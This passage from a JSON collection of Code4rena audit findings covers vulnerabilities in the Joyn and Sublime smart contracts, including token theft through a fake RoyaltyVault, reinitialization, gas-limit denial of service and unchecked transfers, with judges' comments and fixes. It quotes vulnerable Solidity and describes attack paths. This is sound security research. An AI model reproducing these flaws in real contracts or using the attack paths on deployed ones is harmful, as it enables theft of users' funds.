and we intend to fix it. The recommended mitigation looks good and will be considered.\n> \n> We also agree that this is a med risk as this can currently only be done by the contract owner which is us at Joyn\n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/9#issuecomment-1105957959):**\n > Instead of having to come up with a \"reasonable\" `MAX_FEE`, consider instead just preventing the fee from ever being raised, and only allowing it to be lowered.\n\n**[deluca-mike (judge) increased severity to High and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/9#issuecomment-1105964175):**\n > While I was originally leaning Medium Risk, after taking the arguments made by the duplicate issues into account, I am now leaning High Risk. The rationale is that, a DOS of `sendToSplitter` via a high `platformFee` not only harms stakeholders of the `RoyaltyVault` that would get the remainder of the balance, split, but may also prevent all NFT transfers if `sendToSplitter` is hooked into as part of all token transfer, via royalty payments. A malicious or disgruntled `RoyaltyVault` owner can hold all the NFTs hostage that call `sendToSplitter` atomically on transfers.\n> \n> So there are 2 issues that need to be solved here:\n> - protect NFT holders by ensuring `platformFee` (or any other values) cannot be set to a value that would cause `sendToSplitter` to fail (`splitterShare = 0` or `platformShare > balanceOfVault`), or don't have `sendToSplitter` be called on NFT transfers\n> - protect royalty split recipients by putting an arbitrary max to the fee, or only allowing the fee to be reduced\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the code of the RoyaltyVault contract, which allows the owner to set the platform fee to any arbitrary value, including 100%. This would result in the owner being able to steal the entire contract balance and any future balances, avoiding the splitter contract.\n\nTo mitigate this issue, the code should be amended to include a maximum value for the platform fee, such as 5%, and to call the sendToSplitter() function before adjusting the platform fee. This would only allow the owner to change the fee for future values, excluding the current contract balance. The sendToSplitter() function should also be made public rather than external.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/9",
      "tags": [],
      "finders": [
        "minhquanym",
        "leastwood",
        "Dravee",
        "Ruhum",
        "0xDjango",
        "WatchPug",
        "TomFrenchBlockchain",
        "kirk-baird",
        "hyh",
        "hubble",
        "defsec"
      ]
    },
    {
      "id": "1755",
      "title": "[H-04] CoreCollection can be reinitialized",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by 0xkatana, hubble, kirk-baird, leastwood, pedroais, rayn, rfa, Ruhum, saian, securerodd, and WatchPug_\n\nReinitialization is possible for CoreCollection as `initialize` function sets `initialized` flag, but doesn't control for it, so the function can be rerun multiple times.\n\nSuch types of issues tend to be critical as all core variables can be reset this way, for example `payableToken`, which provides a way to retrieve all the contract funds.\n\nHowever, setting priority to be medium as `initialize` is `onlyOwner`. A run by an external attacker this way is prohibited, but the possibility of owner initiated reset either by mistake or with a malicious intent remains with the same range of system breaking consequences.\n\n### Proof of Concept\n\n`initialize` doesn't control for repetitive runs:\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L87>\n\n### Recommended Mitigation Steps\n\nAdd `onlyUnInitialized` modifier to the `initialize` function:\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L46-L49>\n\n\n**[sofianeOuafir (Joyn) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/4#issuecomment-1099562776):**\n > This is a high severity issue and we intend to fix it. The mitigation step looks great and will be considered to fix the issue.\n> \n> In my opinion, the severity level should be 3 (High Risk) instead of 2 (Med Risk)\n\n**[deluca-mike (judge) increased severity to High and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/4#issuecomment-1105941622):**\n > ~~Not convinced this is a high severity issue, since erroneously changing `payableToken` via a re-initialization can simply be corrected by a re-re-initialization to set it back correctly. Further, as the warden mentioned, the initialize function is behind `onlyOwner`.~~\n> \n> ~~However, if it can be shown that users other than the owner can end up losing value due to the owner abusing or erroneously using `initialize`, then it can be promoted to High Severity.~~\n> \n> And just as I say that, #17 points that out clearly. So, yes, agreed, this is a High Severity issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the CoreCollection contract found on the code-423n4/2022-03-joyn repository on GitHub. It is a critical issue, as the `initialize` function can be rerun multiple times, resetting all core variables and allowing retrieval of all the contract funds. The issue is only medium priority, however, as the `initialize` function is `onlyOwner`. The proof of concept is that the `initialize` function does not control for repetitive runs. The recommended mitigation step is to add an `onlyUnInitialized` modifier to the `initialize` function. This will prevent the function from being run multiple times, thus preventing the resetting of core variables and the retrieval of all the contract funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/4",
      "tags": [],
      "finders": [
        "rfa",
        "0xkatana",
        "leastwood",
        "Ruhum",
        "WatchPug",
        "rayn",
        "pedroais",
        "kirk-baird",
        "saian",
        "hyh",
        "securerodd",
        "hubble"
      ]
    },
    {
      "id": "1754",
      "title": "[H-03] DoS: `claimForAllWindows()` May Be Made Unusable By An Attacker",
      "impact": "HIGH",
      "content": "_Submitted by kirk-baird, also found by hyh and Ruhum_\n\nWhen the value of `currentWindow` is raised sufficiently high `Splitter.claimForAllWindows()` will not be able to be called due to the block gas limit.\n\n`currentWindow` can only ever be incremented and thus will always increase. This value will naturally increase as royalties are paid into the contract.\n\nFurthermore, an attacker can continually increment `currentWindow` by calling `incrementWindow()`. An attacker can impersonate a `IRoyaltyVault` and send 1 WEI worth of WETH to pass the required checks.\n\n### Proof of Concept\n\nExcerpt from `Splitter.claimForAllWindows()` demonstrating the for loop over `currentWindow` that will grow indefinitely.\n\n            for (uint256 i = 0; i < currentWindow; i++) {\n                if (!isClaimed(msg.sender, i)) {\n                    setClaimed(msg.sender, i);\n\n                    amount += scaleAmountByPercentage(\n                        balanceForWindow[i],\n                        percentageAllocation\n                    );\n                }\n            }\n\n`Splitter.incrementWindow()` may be called by an attacker increasing `currentWindow`.\n\n        function incrementWindow(uint256 royaltyAmount) public returns (bool) {\n            uint256 wethBalance;\n\n            require(\n                IRoyaltyVault(msg.sender).supportsInterface(IID_IROYALTY),\n                \"Royalty Vault not supported\"\n            );\n            require(\n                IRoyaltyVault(msg.sender).getSplitter() == address(this),\n                \"Unauthorised to increment window\"\n            );\n\n            wethBalance = IERC20(splitAsset).balanceOf(address(this));\n            require(wethBalance >= royaltyAmount, \"Insufficient funds\");\n\n            require(royaltyAmount > 0, \"No additional funds for window\");\n            balanceForWindow.push(royaltyAmount);\n            currentWindow += 1;\n            emit WindowIncremented(currentWindow, royaltyAmount);\n            return true;\n        }\n\n### Recommended Mitigation Steps\n\nConsider modifying the function `claimForAllWindows()` to instead claim for range of windows. Pass the function a `startWindow` and `endWindow` and only iterate through windows in that range. Ensure that `endWindow < currentWindow`.\n\n\n**[sofianeOuafir (Joyn) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/6#issuecomment-1099542295):**\n > In my opinion, the severity level should be 3 (High Risk) instead of 2 (Med Risk)\n> duplicate of #3 \n\n**[deluca-mike (judge) increased severity to High and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/6#issuecomment-1105926348):**\n > While similar, I believe these issues are separate.\n> \n> Issue 3 indicates that the check that `msg.sender` is an authorized `RoyaltyVault` is faulty, since any contract can implement the interface and return the `Splitter` from `getSplitter`. While this should be fixed, as the warden suggested in the Recommended Mitigation Steps in #3, the issue raised in this issue can still occur when enough authorized `RoyaltyVault` contracts call `incrementWindow`.\n> \n> `claimForAllWindows` can remain, but as this warden suggests, a `claimForWindows(uint256 startWindow, uint256 endWindow, uint256 percentageAllocation, bytes32[] calldata merkleProof)` should exist, in case `claimForAllWindows` becomes prohibitively expensive, even organically (i.e. `currentWindow` is made very high due to sufficient authorized `incrementWindow` calls).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Splitter.sol contract, which is part of the 2022-03-joyn repository. The vulnerability occurs when the value of the currentWindow variable is raised too high, which can happen when royalties are paid into the contract. An attacker can also increase the value of currentWindow by calling the incrementWindow() function. This causes the claimForAllWindows() function to be unable to be called, due to the block gas limit. \n\nThe recommended mitigation step is to modify the claimForAllWindows() function to instead claim for a range of windows. The function should be passed a startWindow and endWindow and only iterate through windows in that range, ensuring that endWindow is less than currentWindow.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/6",
      "tags": [
        "Denial-Of-Service",
        "Gas Limit"
      ],
      "finders": [
        "hyh  Ruhum",
        "kirk-baird"
      ]
    },
    {
      "id": "1753",
      "title": "[H-02] Splitter: Anyone can call incrementWindow to steal the tokens in the contract",
      "impact": "HIGH",
      "content": "_Submitted by cccz, also found by hickuphh3, kirk-baird, leastwood, pedroais, rayn, Ruhum, saian, WatchPug, and wuwe1_\n\nIn general, the Splitter contract's incrementWindow function is only called when tokens are transfer to the contract, ensuring that the number of tokens stored in balanceForWindow is equal to the contract balance.\nHowever, anyone can use a fake RoyaltyVault contract to call the incrementWindow function of the Splitter contract, so that the amount of tokens stored in balanceForWindow is greater than the contract balance, after which the verified user can call the claim or claimForAllWindows functions to steal the tokens in the contract.\n\n        function incrementWindow(uint256 royaltyAmount) public returns (bool) {\n            uint256 wethBalance;\n\n            require(\n                IRoyaltyVault(msg.sender).supportsInterface(IID_IROYALTY),\n                \"Royalty Vault not supported\"\n            );\n            require(\n                IRoyaltyVault(msg.sender).getSplitter() == address(this),\n                \"Unauthorised to increment window\"\n            );\n\n            wethBalance = IERC20(splitAsset).balanceOf(address(this));\n            require(wethBalance >= royaltyAmount, \"Insufficient funds\");\n\n            require(royaltyAmount > 0, \"No additional funds for window\");\n            balanceForWindow.push(royaltyAmount);\n            currentWindow += 1;\n            emit WindowIncremented(currentWindow, royaltyAmount);\n            return true;\n        }\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L149-L169>\n\n\n### Recommended Mitigation Steps\n\nAdd the onlyRoyaltyVault modifier to the incrementWindow function of the Splitter contract to ensure that only RoyaltyVault contracts with a specific address can call this function.\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/3#issuecomment-1099540074):**\n > This is a high-risk issue and we intend to solve it. The mitigation provided looks good too and will be considered when fixing this issue ðŸ‘ \n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/3#issuecomment-1105975952):**\n > See a detailed exploit and recommended solution at #21\n\n\n\n***\n\n",
      "summary": "\nThe Splitter contract is vulnerable to a fake RoyaltyVault contract that can call the incrementWindow function, allowing a malicious user to steal tokens from the contract. This vulnerability is located in the Splitter contract's incrementWindow function at lines 149-169. The malicious user can call the claim or claimForAllWindows functions to steal the tokens in the contract. The recommended mitigation steps to prevent this vulnerability is to add the onlyRoyaltyVault modifier to the incrementWindow function of the Splitter contract to ensure that only RoyaltyVault contracts with a specific address can call this function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/3",
      "tags": [],
      "finders": [
        "wuwe1",
        "cccz",
        "leastwood",
        "hickuphh3",
        "Ruhum",
        "WatchPug",
        "rayn",
        "pedroais",
        "kirk-baird",
        "saian"
      ]
    },
    {
      "id": "1752",
      "title": "[H-01] ERC20 transferFrom return values not checked",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by 0xDjango, kirk-baird, leastwood, m9800, minhquanym, and pedroais_\n\nThe `transferFrom()` function returns a boolean value indicating success. This parameter needs to be checked to see if the transfer has been successful. Oddly, `transfer()` function calls were checked.\n\nSome tokens like [EURS](https://etherscan.io/address/0xdb25f211ab05b1c97d595516f45794528a807ad8#code) and [BAT](https://etherscan.io/address/0x0d8775f648430679a709e98d2b0cb6250d2887ef#code) will **not** revert if the transfer failed but return `false` instead. Tokens that don't actually perform the transfer and return `false` are still counted as a correct transfer.\n\n### Impact\n\nUsers would be able to mint NFTs for free regardless of mint fee if tokens that donâ€™t revert on failed transfers were used.\n\n### Recommended Mitigation Steps\n\nCheck the `success` boolean of all `transferFrom()` calls. Alternatively, use OZâ€™s `SafeERC20`â€™s `safeTransferFrom()` function.\n\n**[sofianeOuafir (Joyn) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/52#issuecomment-1099284756):**\n > In my opinion, the severity level should be 3 (High Risk) instead of 2 (Med Risk)\n> \n> This is clearly an issue that needs to be fixed and represents a high risk. Currently, the current state of the code would allow users to mint tokens even if the payment isn't successful.\n> \n\n**[deluca-mike (judge) increased severity to High and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/52#issuecomment-1105345001):**\n > `payableToken` seems to be defined by whomever defines the `Collection` in `createProject`, so it would be possible for that person to define a payable token that, unbeknownst to them, behaves unexpectedly. I agree with high risk (unless there is some person/committee that is curates and validates the `paybaleToken`s ahead of time). Need to handle return from `transfer` and `transferFrom`, as well as erc20s that do not return anything from from `transfer` and `transferFrom`.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `transferFrom()` function in the ERC721Payable.sol contract. This function returns a boolean value indicating success that needs to be checked to ensure the transfer was successful. However, some tokens like EURS and BAT will not revert if the transfer failed but return false instead. This means that users would be able to mint NFTs for free regardless of mint fee if these tokens were used. \n\nThe recommended mitigation steps are to check the `success` boolean of all `transferFrom()` calls or use OZ's `SafeERC20`'s `safeTransferFrom()` function. This will ensure that transfers are successful and users are not able to mint NFTs for free.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/52",
      "tags": [],
      "finders": [
        "minhquanym",
        "leastwood",
        "hickuphh3",
        "0xDjango",
        "pedroais",
        "kirk-baird",
        "m9800"
      ]
    },
    {
      "id": "22278",
      "title": "[08] Inconsistent Naming",
      "impact": "LOW",
      "content": "\nIt would be great to have variable naming kept consistent for better readibility.\n\n*   `_lendingShare`, `_liquidityProvided` to represent `balanceOf(msg.sender, _id);`\n*   `withdrawnShares` vs `sharesWithdrawn`\n\n**[ritik99 (Sublime) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/23#issuecomment-1097691717):**\n > Thanks for the comments! We'll definitely be updating our documentation to make it more detailed, both the external docs as well as inline comments.\n> \n> All the issues mentioned by the warden are relevant. Usually, where approve() is used the allowance is used entirely in the subsequent transfer step, so it shouldn't be an issue, although we'll recheck all such instances. The report is of high quality.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/23#issuecomment-1101881807):**\n > For scoring, also including [Issue #20](https://github.com/code-423n4/2022-03-sublime-findings/issues/20).\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-03-sublime-findings/issues/23#issuecomment-1126080215):**\n > This report is clear / easy to read. The intro is a great addition to provide some high level feedback.\n> \n> * 01: Discrepancy between recorded borrow amount in event and state update<br>\n> Non-critical: This is somewhat arbitrary, but useful feedback to consider. Depending on the use case for consumers of this event, it may be useful to emit both _borrowedAmount and protocolFee as separate params as well.\n>\n> * 02: Use upgradeable version of OZ contracts<br>\n> Non-critical: This is a best practice but as the warden points out it will not break anything in the current state. Switching to ReentrancyGuardUpgradeable would save gas on first usage.\n>\n> * 03: calculatePrincipalWithdrawable() should return user balance for CANCELLED status<br>\n> Low-risk: This impacts an external getter that in the original form may return misleading results after a request is canceled.\n>\n> * 04: Use continue instead of return in _beforeTokenTransfer()<br>\n> Low-risk: If the `return` in this loop is executed than other tokenIds being transferred would skip the `require` checks and possibly some expected state updates. However given that the code currently does not batch mint this effectively has no impact but could crop up unexpectedly after an upgrade as the warden pointed out.\n>\n> * 05: Token approval issues<br>\n> Non-issue: Several wardens pointed to this concern. The way the contract is implemented, approval always resets back to 0 after the transfer so the failure scenario would not arise. It's a good consideration though and something to be careful about to ensure that assumption holds true.\n>\n> * 06: Typos<br>\n> Non-critical: Always nice to fix up the spelling errors.\n>\n> * 07: Definition mix-up in documentation<br>\n> Non-critical: This is a nice catch to improve the documentation. Ramping up on a new protocol takes time and changes like this can help the reader create the right mental models.\n>\n> * 08: Inconsistent Naming<br>\n> Non-critical: Naming is always hard to do well. Improving internal consistency does help the reader.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22277",
      "title": "[07] Definition mix-up in documentation",
      "impact": "LOW",
      "content": "\nReference: <https://docs.sublime.finance/sublime-docs/the-protocol/pooled-credit-lines#creating-a-pooled-credit-line>\n\nThe definitions for the `Collateral Savings Strategy` and `Borrowed Asset Savings Strategy` have been mixed up.\n\n### Recommended Mitigation Steps\n\n```jsx\n9. Collateral Savings Strategy: Savings strategy where any collateral locked in by the borrower will be deployed, e.g., all WBTC deposited by the borrower as collateral could be locked in Aave to earn interest\n10. Borrowed Asset Savings Strategy: Savings strategy where any idle liquidity in the credit line will be deployed, e.g., all the idle USDC in the pooled credit line can be deployed to Compound\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22276",
      "title": "[06] Typos",
      "impact": "LOW",
      "content": "\nDo a CTRL / CMD + F for the following errors:\n\n`terminatd` â†’ `terminated`\n\n`pooleed` â†’ `pooled`\n\n`reqeuested` â†’ `requested`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22275",
      "title": "[05] Token approval issues",
      "impact": "LOW",
      "content": "\n*   `safeApprove()` has been deprecated in favour of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`\n*   using `approve()` might fail because some tokens (eg. USDT) donâ€™t work when changing the allowance from an existing non-zero allowance value\n\n### Recommended Mitigation Steps\n\nUpdate instances of `approve()` and `safeApprove()` to `safeIncreaseAllowance()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22274",
      "title": "[04] Use `continue` instead of `return` in `_beforeTokenTransfer()`",
      "impact": "LOW",
      "content": "\n[LenderPool.sol#L686-L688](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L686-L688)<br>\n\nShould the contract be upgraded to use `_mintBatch()` in the future, the function will terminate prematurely after minting the first id.\n\n### Recommended Mitigation Steps\n\nReplace `return` with `continue`.\n\n```jsx\nif (from == address(0)) {\n  continue;\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22273",
      "title": "[03] `calculatePrincipalWithdrawable()` should return user balance for `CANCELLED` status",
      "impact": "LOW",
      "content": "\n[LenderPool.sol#L579-L592](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L579-L592)<br>\n\nIn the event the borrower cancels his borrow request, the principal withdrawable by the lender should be the liquidity he provided, but the function returns 0 instead.\n\n### Recommended Mitigation Steps\n\nAdd the `CANCELLED` case in the second if branch.\n\n```jsx\nelse if (\n  (\n    _status == PooledCreditLineStatus.REQUESTED &&\n    block.timestamp > pooledCLConstants[_id].startTime &&\n    totalSupply[_id] < pooledCLConstants[_id].minBorrowAmount\n  ) || (_status == PooledCreditLineStatus.CANCELLED)\n) {\n  return balanceOf(_lender, _id);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22272",
      "title": "[02] Use upgradeable version of OZ contracts",
      "impact": "LOW",
      "content": "\n[LenderPool.sol#L7-L9](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L7-L9)<br>\n[PooledCreditLine.sol#L5-L7](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L5-L7)<br>\n\nIt is recommended to use the upgradeable version of OpenZeppelin contracts, as some contracts like ReentrancyGuard has a constructor method to [set the initial status as `_NOT_ENTERED = 1`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L37-L41). The status would currently defaults to `0`, which fortunately doesnâ€™t break the `nonReentrant()` functionality.\n\nNevertheless, it would be recommended to use the upgradeable counterparts instead.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22271",
      "title": "[01] Discrepancy between recorded borrow amount in event and state update",
      "impact": "LOW",
      "content": "\n[PooledCreditLine.sol#L910](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L910)<br>\n[PooledCreditLine.sol#L913](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L913)<br>\n[PooledCreditLine.sol#L917](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L917)<br>\n\nA protocol fee is taken whenever the borrower decides to borrow more tokens. The state update includes this protocol fee, but the amount emitted in the `BorrowedFromPooledCreditLine` event does not.\n\nIn my opinion, since the protocol fee should be included in the emitted event.\n\n### Recommended Mitigation Steps\n\n```jsx\nemit BorrowedFromPooledCreditLine(_id, _borrowedAmount.add(protocolFee));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5274",
      "title": "[G-09] `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "\n1.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [394](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L394))\n\n```solidity\n        require(_minBorrowAmount <= _borrowLimit, 'ILB2');\n```\n\n2.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [778](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L778))\n\n```solidity\n        require(_amount <= _withdrawableCollateral, 'WC1');\n```\n\n3.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [900](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L900))\n\n```solidity\n        require(_amount <= calculateBorrowableAmount(_id), 'B3');\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-09-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "5273",
      "title": "[G-05] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\n1.  File: contracts/PooledCreditLine/LenderPool.sol (lines [694-698](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L694-L698))\n\n```solidity\n    function _rebalanceInterestWithdrawn(\n        uint256 id,\n        uint256 amount,\n        address from,\n        address to\n```\n\n2.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [388](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L388))\n\n```solidity\n    function _limitBorrowedInUSD(address _borrowToken, uint256 _borrowLimit, uint256 _minBorrowAmount) internal view {\n```\n\n3.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [671](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L671))\n\n```solidity\n    function _createRequest(Request calldata _request) internal returns (uint256) {\n```\n\n4.  File: contracts/PooledCreditLine/PooledCreditLine.sol (lines [693-701](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L693-L701))\n\n```solidity\n    function _notifyRequest(\n        uint256 _id,\n        address _lenderVerifier,\n        address _borrowToken,\n        address _borrowAssetStrategy,\n        uint256 _borrowLimit,\n        uint256 _minBorrowedAmount,\n        uint256 _collectionPeriod,\n        bool _areTokensTransferable\n```\n\n5.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [897](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L897))\n\n```solidity\n    function _borrow(uint256 _id, uint256 _amount) internal {\n```\n\n6.  File: contracts/PooledCreditLine/PooledCreditLine.sol (lines [955-959](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L955-L959))\n\n```solidity\n    function _withdrawBorrowAmount(\n        address _asset,\n        address _strategy,\n        uint256 _amountInTokens\n    ) internal returns (uint256) {\n```\n\n7.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [1019](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1019))\n\n```solidity\n    function _repay(uint256 _id, uint256 _amount) internal returns (uint256) {\n```\n\n8.  File: contracts/PooledCreditLine/PooledCreditLine.sol (line [1223](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1223))\n\n```solidity\n    function updateStateOnPrincipalChange(uint256 _id, uint256 _updatedPrincipal) internal {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-05-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5272",
      "title": "[G-03] `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "\nEven memory arrays incur the overhead of bit tests and bit shifts to calculate the array length\n\n1.  File: contracts/PooledCreditLine/LenderPool.sol (line [670](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L670))\n\n```solidity\n        for (uint256 i; i < ids.length; ++i) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
      "github_link": "#g-03-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop",
      "tags": [],
      "finders": []
    },
    {
      "id": "5271",
      "title": "[G-02] `++i`/`i++` should be `unchecked{++i}`/`unchecked{++i}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "\n1.  File: contracts/PooledCreditLine/LenderPool.sol (line [670](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L670))\n\n```solidity\n        for (uint256 i; i < ids.length; ++i) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2022-03-sublime",
